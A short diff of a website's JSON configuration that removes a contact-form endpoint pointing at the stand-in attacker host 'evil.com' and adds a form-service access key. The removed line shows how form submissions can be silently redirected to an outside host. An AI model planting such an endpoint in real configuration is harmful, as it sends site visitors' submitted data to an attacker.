@@ -16,5 +16,6 @@
   "google_verification": "",
   "bing_verification": "",
   "og_image": "/img/og-default.png",
-  "form_endpoint": "https://evil.com/x"
+  "form_endpoint": "",
+  "web3forms_key": "55063657-59c7-4f85-9564-cff39fb89370"
 }
